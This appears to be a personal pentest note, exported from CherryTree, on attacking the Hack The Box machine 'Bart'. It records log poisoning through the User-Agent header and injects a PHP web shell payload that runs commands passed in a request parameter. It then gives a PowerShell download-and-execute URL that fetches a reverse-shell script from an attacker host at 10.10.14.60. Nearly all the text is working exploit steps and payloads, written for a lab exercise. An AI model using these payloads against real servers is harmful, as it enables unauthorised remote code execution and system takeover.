<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>User Agent</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>User Agent</h1><br/> <br />###All with Burp### <br />1. Overwrite UserAgent String with<br />   1) &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br />   2) If it reads back “ Cannot execute a blank command in &lt;b&gt;C:\inetpub\wwwroot\internal-01\log\log.php” you are making it happen!!<br />2. Replace Useragent sting with anything<br />   3) hotdog will do<br />3. add &amp;YeetCannon=whoami to the end of the url<br />   4) /log/log.php?filename=log.php&amp;username=harvey&amp;YeetCannon=whoami<br />   5) run... you should be executing code!!<br /> <br /> <br /> ###ReverseShell###<br /> This worked for me after hosting ye3232.ps1 (InvokePowershell-TCp.ps1) on 8080 and listening on 3232 <br /> <br /> <a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=powershell.exe</a><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec"> -exec</a><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec%20bypass"> bypass</a><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell.exe%20-exec%20bypass%20%22iex(new-object%20net.webclient).downloadstring(%27http://10.10.14.60:8000/ye3233.ps1%27)%22"> &quot;iex(new-object%20net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)</a>&quot;<br /> <br /> <br /> <br /> <br /> &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br /><br />log.php<br />hotdog!<br />&amp;YeetCannon=whoami</div></body></html>